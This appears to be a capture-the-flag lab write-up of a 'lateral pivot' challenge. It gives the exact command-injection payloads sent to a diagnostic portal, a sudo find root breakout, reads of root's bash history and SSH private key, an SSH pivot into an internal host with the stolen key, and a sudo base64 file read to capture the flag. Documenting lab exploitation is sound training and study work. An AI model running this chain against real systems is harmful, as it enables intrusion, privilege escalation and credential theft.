# Tier 1 (Easy) — Lateral Pivot — Antanom Run

**Target:** 135.181.63.243:8080 (VM internal 172.21.0.10)
**Flag:** `FLAG{ANTANOM_LATERAL_PIVOT_PWN_7749}`
**Result:** SOLVED

## Timing / Step Count
- **Wall-clock (active):** ~3–4 minutes
- **Distinct HTTP requests to target:** 8
  1. `GET /` — fingerprint the web app (Ops Diagnostic Portal)
  2. `POST host=127.0.0.1; whoami` — confirm RCE (`www-data`)
  3. `POST host=127.0.0.1; sudo -l` — (attempted, output truncated; pivoted to direct root shell)
  4. `POST host=127.0.0.1; sudo find ... id` — confirm GTFOBins root breakout (`uid=0(root)`)
  5. `POST host=... cat /root/.bash_history` + `cat /root/.ssh/id_rsa` — harvest pivot creds
  6. `POST host=... ip -4 addr` — map internal subnets (172.21.0.10/24, 172.20.0.10/24)
  7. `POST host=... ssh -i /root/.ssh/id_rsa deployer@172.21.0.20 "cat /root/flag.txt"` — (perm denied, non-root deployer)
  8. `POST host=... ssh ... "sudo base64 /root/flag.txt"` — capture base64 flag
- **Decisions / reasoning steps:** ~12
- **Dead ends:** 2 (rshell outbound blocked 172.20.x→192.168 LAN; grep flag-pattern quoting)

## Kill Chain
1. **Foothold (www-data):** Unsanitized OS command injection.
   - `app.py:30` → `cmd = f'ping -c 1 {host}'` executed via `subprocess.check_output(cmd, shell=True)`.
   - Payload: `host=127.0.0.1; whoami` → `www-data` (RCE as web user).
2. **PrivEsc → root (Target 1):**
   - `sudo -l` → `(ALL) NOPASSWD: /usr/bin/find`.
   - GTFOBins: `sudo find / -maxdepth 0 -exec sh -c '<cmd>' \; -quit`.
   - `id` → `uid=0(root)`.
3. **Lateral Pivot → Target 2 (172.21.0.20):**
   - Root `.bash_history`: `ssh -o StrictHostKeyChecking=no deployer@172.21.0.20`.
   - Key: `/root/.ssh/id_rsa` (comment `root@ctf-lab-vm`, authorized for `deployer`).
   - Constraint: local Mac (192.168.0.103) cannot reach 172.21.0.0/24; VM CAN (eth0=172.21.0.10).
   - Pivoted by running SSH **from the VM** through the RCE: `ssh -i /root/.ssh/id_rsa deployer@172.21.0.20` (non-root `deployer`).
4. **PrivEsc → flag (Target 2):**
   - `deployer` → `sudo /usr/bin/base64` (GTFOBins file-read).
   - `sudo base64 /root/flag.txt` → `RkxBR3tBTlRBTk9NX0xBVEVSQUxfUElWT1RfUFdOXzc3NDl9Cg==`
   - decode → `FLAG{ANTANOM_LATERAL_PIVOT_PWN_7749}`

## Key Notes / Lessons
- Outbound from the CTF VM to the attacker LAN was blocked (firewall/egress), so interactive rshells were useless; a **one-shot command-every-request** workflow was more reliable.
- Running the pivot SSH *from* the compromised VM sidestepped the local↔internal network gap without needing a full proxy.
- The flag is base64-wrapped; `sudo base64` is the GTFOBins read primitive, not just a codec.
